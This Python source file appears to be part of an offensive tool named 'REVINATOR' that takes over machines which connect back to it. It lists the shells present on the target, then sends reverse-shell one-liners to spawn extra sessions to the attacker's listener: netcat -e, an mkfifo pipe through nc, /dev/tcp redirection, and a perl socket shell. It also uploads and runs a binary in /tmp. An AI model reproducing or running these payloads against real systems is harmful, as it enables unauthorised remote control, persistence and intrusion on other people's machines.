#!/usr/bin/env python

import socket
import threading
import os
import pdb
import time

class spawner:
    all = {}
    
    def __init__(self, conn):
        self.conn = conn[0]
        self.addr = conn[1][0]
        self.port = conn[1][1]
        self.sock = socket.socket()
        self.revs = []
        self.working_rev = ""
        self.echo_count = None
        self.conn.settimeout(0.2)
        self.kill_cmd = False
        self.num_cons = 0
        self.banned = []
        self.children = []
        if not self.echo_cmd_test():
            self.kill()
            return
        threading.Thread(target=self.set_rev).start()
        spawner.all[self.addr] = self

    def kill(self):
        self.conn.close()
        self.sock.close()
        self.kill_cmd = True


    def rcv(self):
        data = ""
        while True:
            try:
                d = self.conn.recv(1024).decode()
                if d:
                   data += d
                else:
                    return data
            except TimeoutError:
                return data
            
    def echo_cmd_test(self):
        cmd = "echo HI_REVINATOR\r\n\r\n"
        self.conn.send(cmd.encode())
        data = self.rcv()

        self.echo_count = data.count("echo HI_REVINATOR")
        if "HI_REVINATOR" not in data.replace("echo HI_REVINATOR", ""):
            return False
        return True

    def send_rcv(self, cmd):

        cmd += "; echo REVINATOR_COMPLETE\r\n\r\n"
        self.conn.send(cmd.encode())

        data = self.rcv()
        while data.count("REVINATOR_COMPLETE") < self.echo_count + 1:
            time.sleep(0.1)

        return data

    def file_upload(self, filepath, target_filepath):
        print("UPLOADING", filepath, target_filepath)
        self.create_new()
        time.sleep(0.5)
        child = self.children[-1]

        s = f"cat > {target_filepath}\n"
        child.conn.send(s.encode())
        with open(filepath,"rb") as f:
            r = f.read()
        child.conn.sendall(r)
        #child.conn.sendall("\x04".encode())
        child.conn.close()
        
        child.kill()
        print("SENT FILE")


    def test_revs(self):
        inc = ["&",""]
        self.working_rev = ""
        num = self.num_cons
        if len(self.banned) >= len(self.revs) * 2:
            print("NO MORE REVS LEFT")
            return
        for i in inc:
            for rev in self.revs:
                rev += f" {i} \r\n\r\n"
                if rev in self.banned:
                    continue
                self.conn.send(rev.encode())
                time.sleep(0.1)
                if self.num_cons > num:
                    self.working_rev = rev
                    return
                else:
                    self.banned.append(rev)
                    if len(self.banned) >= len(self.revs) * 2:
                        print("NO MORE REVS LEFT")
                        return
            

    def test_all_(self):
        if not self.echo_cmd_test():
            print("ECHO FAIL SPAWNER")
        for child in self.children:
            if not child.echo_cmd_test():
                #print("ECHO FAIL", child.conn)
                child.kill()


    def test_all(self):
        threading.Thread(target=self.test_all_).start()


    def send(self, st):
        st = st + "\n"
        self.conn.send(st.encode())

    def recv(self):
        r = ""
        try:
            r = self.conn.recv(1024).decode()
        except:
            pass
        return r

    def send_bin(self):
        print("SENDING BIN")
        self.send("cat > /tmp/revinator; chmod +x /tmp/revinator; /tmp/revinator")#
        FILE = "rev5555"
        with open(FILE,"rb") as f:
            r = f.read()
        self.conn.sendall(r)
        self.conn.sendall("\x04".encode())
        self.conn.close()
        #self.send(f"\x04")
        #self.send("chmod +x /tmp/revinator")
        #self.send("/tmp/revinator")
        self.revs.append("/tmp/revinator &")


    def set_rev(self):
        global new_rev
        #data = self.send_rcv("find /bin/ /usr/bin/")
        data = self.send_rcv("ls /bin/")
        data += self.send_rcv("ls /usr/bin/")

        #bins = data.split("\n")
        bins = data.split()
        shells = ["bash","dash","sh","bsh","csh","ksh","zsh","pdksh","tcsh","mksh"]
        known_shells = []
        progs = {}

        for bin in bins:
            progs[bin.split("/")[-1]] = bin



        IP = self.conn.getsockname()[0]
        PORT = self.conn.getsockname()[1]

        if "perl" in progs:
            for sh in shells:
                if sh in progs:
                    c = """perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("SH -i");};'""".replace("IP", IP).replace("PORT", str(PORT)).replace("SH", sh)
                    #self.revs.append(c)


        for shell in shells:
            #sh = f"/bin/{shell}"
            if shell in bins:
                known_shells.append(shell)

            #sh = f"/usr/bin/{shell}"
            #if sh in bins:
            #    known_shells.append(sh)


        if "nc" in bins:
            for sh in known_shells:
                self.revs.append(f"nc {IP} {PORT} -e {sh} ")
                self.revs.append(f"nc -c {sh} {IP} {PORT} ")
                self.revs.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f| {sh} -i 2>&1|nc {IP} {PORT} >/tmp/f ")
                self.revs.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f| {sh} -i 2>&1| nc {IP} {PORT} >/tmp/f ")
                self.revs.append(f"nc {IP} {PORT} -e {sh} ")
                self.revs.append(f"nc -c {sh} {IP} {PORT} ")

        #if "/bin/nc" in bins:
        #    for sh in known_shells:
        #        self.revs.append(f"nc {IP} {PORT} -e {sh}")
        #        self.revs.append(f"nc -c {sh} {IP} {PORT}")
        #        self.revs.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{sh} -i 2>&1|nc {IP} {PORT} >/tmp/f")
        #        self.revs.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{sh} -i 2>&1|/bin/nc {IP} {PORT} >/tmp/f")
        #        self.revs.append(f"/bin/nc {IP} {PORT} -e {sh} ")
        #        self.revs.append(f"/usr/bin/nc -c {sh} {IP} {PORT} ")

        for sh in known_shells:
            self.revs.append(f"0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; {sh} <&196 >&196 2>&196")
            self.revs.append(f"{sh} -i >& /dev/tcp/{IP}/{PORT} 0>&1")


        self.test_revs()
        global unique_addresses
        print(f"{len(spawner.all) - 1}:\t{self.addr}")
        #new_rev[self.addr] = self.revs


    def create_new(self):
        self.conn.send(self.working_rev.encode())

    def report_pass(self):
        
        if self.echo_cmd_test():
            return
        print("SINGLE SESSION FOUND")
        self.children[0].kill()

        self.singles.append(self.working_rev)
        self.working_rev = ""

        self.test_revs()


    def report_fail(self):
        print("FAIL REPORTED")

        self.banned.append(self.working_rev)
        self.working_rev = ""

        self.test_revs()
